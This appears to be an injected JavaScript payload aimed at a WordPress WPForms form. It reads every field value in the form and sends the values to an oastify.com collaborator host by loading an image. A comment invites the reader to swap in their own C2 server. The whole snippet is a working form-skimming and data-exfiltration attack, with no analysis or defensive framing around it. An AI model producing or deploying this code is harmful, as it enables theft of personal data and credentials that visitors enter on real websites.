(function() {
    function sendFormData() {
        var formData = {};
        var form = document.getElementById('wpforms-form-6402');
        
        if (form) {
            form.querySelectorAll('input, select, textarea').forEach(function(input) {
                formData[input.name] = input.value;
            });

            // Convert formData object to query string
            var queryString = Object.keys(formData).map(function(key) {
                return encodeURIComponent(key) + '=' + encodeURIComponent(formData[key]);
            }).join('&');

            // Use an image to send the data
            var img = new Image();
            img.src = 'http://kc0yatluwfpwgykzme2636pe95fw3mrb.oastify.com?' + queryString; // Replace with your C2 server URL
        }
    }

    // Inject the function into the page and execute it
    sendFormData();
})();
